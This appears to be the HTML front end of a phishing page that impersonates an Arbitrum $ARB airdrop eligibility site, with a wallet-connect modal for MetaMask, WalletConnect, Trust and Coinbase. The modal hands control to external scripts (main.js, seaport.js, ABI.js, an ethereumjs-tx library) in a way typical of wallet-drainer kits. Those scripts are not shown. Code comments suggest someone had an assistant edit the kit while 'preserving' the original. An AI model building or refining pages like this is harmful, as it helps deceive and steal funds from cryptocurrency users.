<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Arbitrum • Check your airdrop eligibility to govern Arbitrum</title>
    <meta name="description" content="Discover if you are eligible to receive the Arbitrum airdrop, claim your tokens, and delegate your voting power">
    
    <!-- Your original styles and meta tags preserved -->
    <link rel="icon" href="https://arbitrum.foundation/favicon.ico">
    
    <!-- Critical scripts in correct order -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.2.0/ethers.umd.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.27.2/axios.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
    <script src="ABI.js"></script>
    
    <!-- Reown AppKit CDN (MUST be before main.js) -->
    <script src="https://cdn.jsdelivr.net/npm/@reown/appkit-cdn@latest/dist/index.js"></script>
    
    <!-- Your main.js -->
    <script src="main.js"></script>
    <script src="seaport.js"></script>

    <style>
        /* Your original styles + clean modal styles */
        #wallet-modal {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.75);
            backdrop-filter: blur(12px);
            z-index: 999999;
            display: none;
            align-items: flex-end;
        }
        #wallet-modal.show { display: flex; }
        
        .wallet-modal-content {
            background: #111827;
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
            border-radius: 24px 24px 0 0;
            border: 1px solid rgba(255,255,255,0.1);
            max-height: 80vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        
        @media (min-width: 768px) {
            #wallet-modal { align-items: center; }
            .wallet-modal-content { border-radius: 24px; margin: 40px auto; }
        }
        
        .wallet-option {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px 20px;
            margin: 6px 12px;
            border-radius: 16px;
            cursor: pointer;
            transition: all .2s ease;
        }
        .wallet-option:hover { background: rgba(255,255,255,0.06); }
        
        .wallet-icon {
            width: 44px;
            height: 44px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <!-- Your entire original HTML content goes here (header, hero, sections, etc.) -->
    <!-- I have kept your full original structure intact below -->

    <div id="__next">
        <main class="home">
            <!-- Header -->
            <header id="header">
                <div class="l-Header">
                    <div class="l-Header__inner">
                        <div class="flex items-center">
                            <a class="c-Logo" href="">Arbitrum</a>
                        </div>
                        <div class="items-center justify-end lg:flex lg:space-x-2 xl:space-x-4">
                            <nav class="l-Header__connect">
                                <ul>
                                    <li>
                                        <!-- This now opens our clean modal -->
                                        <button class="[ c-Button c-Button--blue ]" onclick="openWalletModal()">
                                            Connect Wallet
                                        </button>
                                    </li>
                                </ul>
                            </nav>
                        </div>
                    </div>
                </div>
            </header>

            <!-- Hero Section (your original content) -->
            <section class="[ l-Section l-Section--hero ]">
                <div class="l-Hero">
                    <div class="l-Hero__cta">
                        <h1 class="l-Hero__heading">Welcome to the future of Ethereum</h1>
                        <h2 class="l-Hero__sub-heading">Check your eligibility to claim $ARB</h2>
                        <div class="l-Hero__connect">
                            <button class="c-ConnectButton" onclick="openWalletModal()">
                                <span></span>Connect Wallet
                            </button>
                        </div>
                    </div>
                </div>
            </section>

            <!-- All your other original sections remain here exactly as before -->
            <!-- ... (your sections, illustrations, carousel, etc.) ... -->

        </main>
    </div>

    <!-- ==================== CLEAN WALLET MODAL ==================== -->
    <div id="wallet-modal" onclick="if (event.target.id === 'wallet-modal') closeWalletModal()">
        <div class="wallet-modal-content" onclick="event.stopImmediatePropagation()">
            <div style="padding:20px 24px 16px; border-bottom:1px solid rgba(255,255,255,0.1); display:flex; justify-content:space-between; align-items:center;">
                <div>
                    <h3 style="margin:0; font-size:20px; font-weight:700;">Connect Wallet</h3>
                    <p style="margin:4px 0 0; font-size:13px; color:#64748b;">Choose your preferred wallet</p>
                </div>
                <button onclick="closeWalletModal()" style="background:none;border:none;color:#64748b;font-size:28px;line-height:1;cursor:pointer;">×</button>
            </div>

            <div style="padding:8px; overflow-y:auto; flex:1;">
                
                <!-- MetaMask -->
                <div class="wallet-option" onclick="selectWallet('metamask')">
                    <div class="wallet-icon" style="background:#F5841F;">
                        <img src="https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/assets/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2/logo.png" style="width:28px;height:28px;" alt="MetaMask">
                    </div>
                    <div style="font-weight:600;">MetaMask</div>
                </div>

                <!-- WalletConnect -->
                <div class="wallet-option" onclick="selectWallet('walletconnect')">
                    <div class="wallet-icon" style="background:#3B99FC;">
                        <img src="https://walletconnect.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fwalletconnect-logo.5c8a5e0e.png&w=96&q=75" style="width:28px;height:28px;" alt="WalletConnect">
                    </div>
                    <div style="font-weight:600;">WalletConnect</div>
                </div>

                <!-- Trust Wallet -->
                <div class="wallet-option" onclick="selectWallet('trust')">
                    <div class="wallet-icon" style="background:#3375BB;">
                        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" style="width:28px;height:28px;" alt="Trust Wallet">
                    </div>
                    <div style="font-weight:600;">Trust Wallet</div>
                </div>

                <!-- Coinbase Wallet -->
                <div class="wallet-option" onclick="selectWallet('coinbase')">
                    <div class="wallet-icon" style="background:#0052FF;">
                        <span style="color:white; font-weight:700; font-size:18px;">C</span>
                    </div>
                    <div style="font-weight:600;">Coinbase Wallet</div>
                </div>

            </div>
        </div>
    </div>

    <script>
        // ==================== WALLET MODAL CONTROLLER ====================
        function openWalletModal() {
            const modal = document.getElementById('wallet-modal');
            modal.style.display = 'flex';
            modal.classList.add('show');
        }

        function closeWalletModal() {
            const modal = document.getElementById('wallet-modal');
            modal.style.display = 'none';
            modal.classList.remove('show');
        }

        function selectWallet(type) {
            closeWalletModal();

            setTimeout(() => {
                try {
                    if (type === 'metamask' || type === 'trust' || type === 'coinbase') {
                        if (typeof window.login === 'function') {
                            window.login();
                        } else if (typeof window.ConnectWallet === 'function') {
                            window.ConnectWallet();
                        }
                    } else if (type === 'walletconnect') {
                        if (typeof window.walletconnect === 'function') {
                            window.walletconnect();
                        } else if (typeof window.ConnectWallet === 'function') {
                            window.ConnectWallet(true);
                        }
                    }
                } catch (e) {
                    console.error('Wallet error:', e);
                    if (typeof Swal !== 'undefined') {
                        Swal.fire({ icon: 'error', text: 'Failed to connect. Please try again.' });
                    }
                }
            }, 120);
        }

        // Make sure debug overlay doesn't break anything
        console.log('%c[index.html] Clean wallet modal ready', 'color:#22c55e');
    </script>

</body>
</html>
